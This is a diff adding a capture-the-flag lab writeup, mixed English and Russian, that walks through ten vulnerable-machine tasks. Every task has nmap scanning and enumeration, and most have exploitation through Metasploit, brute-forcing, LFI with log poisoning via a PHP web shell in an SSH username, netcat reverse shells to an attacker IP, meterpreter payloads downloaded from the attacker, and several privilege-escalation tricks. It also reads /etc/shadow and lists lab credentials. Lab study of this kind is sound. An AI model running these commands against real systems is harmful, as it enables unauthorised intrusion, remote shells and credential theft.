@@ -1,0 +1,222 @@
+=== Writeup ===
+##### Day 1 ######
+### Task 1 ### 
+##Network Scanning 
+nmap -sn -e <интерфейс> --min-parallelism <количество-воркеров> <IP-адрес/диапазон-IP>
+nmap -sV -sS -A 127.0.0.1 --script vuln #tcp
+##Enumeration
+dirb http://127.0.0.1:8080/ -X .php,.zip
+wget http://192.168.1.186:8080/backup.zip
+unzip backup.zip
+fcrackzip -D -p /usr/share/wordlists/rockyou.txt -u backup.zip
+unzip backup.zip
+cat tomcat-users.xml -> login:admin pass:melehifokivai
+##Exploitation
+msfconsole
+use exploit/multi/http/tomcat_mgr_upload
+set rhosts 192.168.1.186
+set rport 8080
+set httpusername admin
+set httppassword melehifokivai
+exploit
+Get meterpreter session
+Finded ./look in ~/Files
+run ./look '' /etc/shadow and get /etc/shadow
+john --wordlist=/usr/share/wordlists/rockyou.txt hash
+# Privilege Escalation
+ssh randy@192.168.1.186
+sudo -l
+cat /home/randy/randombase64.py
+ls -la /usr/lib/python3.8/base64.py
+Add in /usr/lib/python3.8/base64.py: 
+```
+import os
+os.system ("/bin/bash")
+```
+sudo /usr/lib/python3.8 /home/randy/randombase64.py
+
+### Task 2 ### 
+##Network Scanning 
+nmap -sn -e <интерфейс> --min-parallelism <количество-воркеров> <IP-адрес/диапазон-IP>
+nmap -sV -sS -A 127.0.0.1 --script vuln #tcp
+##Enumeration
+smbclient -L \\192.168.0.4
+smbclient //192.168.0.4/Naruto  # find text file with a hint "Gara"
+go to http://127.0.0.1/gara and get drupal page
+##Exploitation
+msf6 > use exploit/unix/webapp/drupal_restws_unserialize
+msf6 exploit (unix/webapp/ drupal_restws_unserialize) > set rhosts 192.168.0.4
+msf6 exploit (unix/webapp/ drupal_restws_unserialize) > set targeturi /gara
+msf6 exploit (unix/webapp/ drupal_restws_unserialize) > set lhost 127.0.0.1
+msf6 exploit (unix/webapp/ drupal_restws_unserialize) > exploit
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+netstat -antp or ss -lntp #find 127.0.0.1:8080
+curl 127.0.0.1:8080 -> get user:yashika pass:raj@123
+
+# Privilege Escalation
+getcap -r / 2>/dev/null
+./perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
+id -> uid=0(root)
+
+### Task 3 ### 
+##Network Scanning 
+nmap -sn -e <интерфейс> --min-parallelism <количество-воркеров> <IP-адрес/диапазон-IP>
+nmap -sV -sS -A 127.0.0.1 --script vuln #tcp
+##Enumeration
+dirb http://192.168.1.101/ -X .txt
+wget http://192.168.1.101/secret.txt
+cat secret.txt -> get hint 
+head -n 100 rockyou.txt > dict.txt
+hydra -l joker -P dict.txt http://127.0.0.1/ -s 8080 -t 64 http-get / -> get cred joker:hannah
+login to http://127.0.0.1:8080/ 
+dirb http://127.0.0.1:8080/ -> get joomla admin page http://127.0.0.1:8080/administrator/ with default cred, login and go to edit extentions
+upload msfvenom payload to index.php and start expolit/multi/handler
+get meterpreter session 
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+
+#Privilege Escalation
+--- Выолняем на своей машине ---
+git clone https://github.com/saghul/lxd-alpine-builder.git 
+cd lxd-alpine-builder
+./build-alpine # собираем алпайн контейнер
+python2 -m SimpleHTTPServer # запускаем в папке где мы создали контейнер http сервер
+--- На уязвимом хосте ---
+wget http://192.168.1.107:8000/alpine-v3.10-x86_64-20191019_0712.tar.gz
+lxc image import ./alpine-v3.10-x86_64-20191019_0712.tar.gz --alias myimage # импортим образ
+lxc image list # проверяем что импорт прошел успешно 
+lxc init myimage ignite -c security.privileged=true # инициализирем контейнер
+lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true # монтируем / как диск 
+lxc start ignite # запускаем контейнер
+lxc exec ignite /bin/sh # заходим в контейнер, переходим в папку где примонтирован /
+
+### Task 4 ### 
+##Network Scanning 
+nmap -sn -e <интерфейс> --min-parallelism <количество-воркеров> <IP-адрес/диапазон-IP>
+nmap -sV -sS -A 127.0.0.1 --script vuln #tcp
+#Enumeration
+go to 127.0.0.1:10000 find comment "this web server is running in ssl mode".
+Add to /etc/hosts:
+127.0.0.1 hostname
+find LFI in /account/index.php page
+dig @127.0.0.1 greenoptic.vm axfr # получаем все A dns записи, находим данную запись recoveryplan.greenoptic.vm c basic auth
+Через LFI получаем /var/www/.htpasswd 
+Авторизуемся recoveryplan.greenoptic.vm и находим архив и сообщение, в котором указанно что sam получил пароль от архива на почту 
+Получаем пароль из /var/mail/sam , через LFI
+Внутри лежит dpi.pcap, открываем через wireshark и находим в одном из пакетов, который был отправлен через протокол ftp логин и пароль к учетной записи Alex
+Заходим с полученными данными по ssh
+##Privilege Escalation
+Находим в этом же дампе base64 в котором записан пароль для рута.
+Повышаем привилегии
+ 
+### Task 5 ### 
+##Network Scanning 
+nmap -sn -e <интерфейс> --min-parallelism <количество-воркеров> <IP-адрес/диапазон-IP>
+nmap -sV -sS -A 127.0.0.1 --script vuln #tcp
+##Enumeration
+Смотри source code страницы, и находим в html коментарии подсказку 
+#Exploit
+Пытаемся по подсказке выполнить lfi 
+http://192.168.1.31/ikilledsiriusblack.php?file=/etc/passwd
+Далее пытаемся авторизоватся по ssh '<?php system($_GET['c']); ?>'@192.168.1.31, чтобы запись об этом осталась в логах
+Исполним php код, который мы загрузили: http://192.168.1.31/ikilledsiriusblack.php?file=/var/log/auth.log
+nc -lvp 1234
+http://192.168.1.31/ikilledsiriusblack.php?file=/var/log/auth.log&c=ncat -e /bin/bash 192.168.1.2 1234
+Получаем shell
+В папке .secret.dic находим hash 
+Закидываем его в john и получаем пароль 
+##Privilege Escalation
+sudo -l
+sudo vim -c ':!/bin/sh' #повышение привилегий через vim 
+
+##### Day 2 ######
+### Task 1 ### 
+##Network Scanning 
+nmap -sn -e <интерфейс> --min-parallelism <количество-воркеров> <IP-адрес/диапазон-IP>
+nmap -sV -sS -A 127.0.0.1 --script vuln #tcp
+##Enumeration
+dirb http://192.168.1.165/ -> /logs/management.log
+enum4linux -a 192.168.1.165 
+smbclient //192.168.1.165/ITDEPT
+echo "nc -e /bin/bash -lvp 1234 &" > product-control
+echo "nc -e /bin/bash -lvp 1235 &" > web-control
+put product-control
+put web-control
+nc 192.168.1.165 1234
+python -c 'import pty;pty.spawn("/bin/bash")'
+##Privilege Escalation
+find / -perm -u=s -type f 2>/dev/null -> /usr/bin/zsh
+/usr/bin/zsh -> root
+
+### Task 2 ### 
+##Network Scanning 
+nmap -sn -e <интерфейс> --min-parallelism <количество-воркеров> <IP-адрес/диапазон-IP>
+nmap -sV -sS -A 127.0.0.1 --script vuln #tcp
+##Enumeration
+searchsploit Weborf 0.12.2
+searchsploit -m 14925 -> LFI
+dirb http://192.168.1.197:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..home%2fweborf%2f
+find http://192.168.1.197:8080/..%2f..%2f..%2f..%2f..%2f..%2f..%2f..home%2fweborf%2f/.mysql history with login and pass for db login:weborf pass: iheartrainbows44
+#Exploitation
+ssh weborf@192.168.1.197
+iheartrainbows44
+mysql -u weborf -p
+show databases;
+use mysql;
+show tables;
+select * from user; -> get sunrise:thefutureissobrightigottawearshades
+su sunrise
+sudo -l -> wine
+##Privilege Escalation
+msfpc windows 192.168.1.107
+python2 -m SimpleHTTPServer 8080
+wget http://192.168.1.107:8080/windows-meterpreter-staged-reverse-tcp-443.exe
+sudo wine windows-meterpreter-staged-reverse-tcp-443.exe
+use explot/multi/handler 
+exploit
+Get root
+
+### Task 3 ### 
+##Network Scanning 
+nmap -sn -e <интерфейс> --min-parallelism <количество-воркеров> <IP-адрес/диапазон-IP>
+nmap -sV -sS -A 127.0.0.1 --script vuln #tcp
+##Enumeration
+Смотрим исходный код страницы, находим логин itsskv
+dirb http://192.168.1.165/ -> /robots.txt -> flag in robots.txt
+##Exploiting
+Подключаемся по ssh используя в качестве логина itsskv, а паролем является флаг, который мы нашли в /robots.txt
+##Privilege Escalation
+uname -a #Замечаем что ядро старой версии
+Через exploitdb находим exploit и мсполняем его, тем самым получив root
+
+### Task 4 ###
+##Network Scanning 
+nmap -sn -e <интерфейс> --min-parallelism <количество-воркеров> <IP-адрес/диапазон-IP>
+nmap -sV -sS -A 127.0.0.1 --script vuln #tcp
+##Enumeration
+add hostname to /etc/hosts
+dirb http://192.168.1.165/ -X .php.bak -> config.php.bak -> Данные для подключения к бд
+Перебираем через gobuster hostname 
+gobuster vhost -u test.dns -w /usr/share/wordlists/dirb/big.txt
+Находим datasafe.hostname.local, там находится phpmyadmin, авторизуемся под логином и паролем, которые есть в config.php.bak
+В базе данных находим hash от пользователя admin, ставим его на брут в john -> admin:Stella
+Авторизуемся под админом в phpmyadmin, замечаем что версия является уязвимой. 
+Эсплотируем уязвимость через эксплоит.
+Получаем доступ к хосту.
+##Privilege Escalation
+getcap -r / 2>/dev/null -> tarS
+tarS -cvf /root.tar /root
+
+### Task 5 ###
+##Network Scanning 
+nmap -sn -e <интерфейс> --min-parallelism <количество-воркеров> <IP-адрес/диапазон-IP>
+nmap -sV -sS -A 127.0.0.1 --script vuln #tcp
+##Enumeration
+dirb http://192.168.1.165/ -> /antibot_image/antibots
+curl http://192.168.1.165/antibot_image/antibots/info.php -> ?image
+LFI: curl http://192.168.1.165/antibot_image/antibots/info.php?image=../../../../../../etc/passwd
+Залогинемся по ssh '<?php system($_GET['cmd']); ?>'@192.168.1.165, чтобы это осталось в логах
+Через lfi вызываем php и загружаем reverse shell
+Получаем сессию на metterpreter 
+##Privilege Escalation
+Повышаем привилегии за счет уязвимого ядра линукс
+https://www.exploit-db.com/exploits/45010
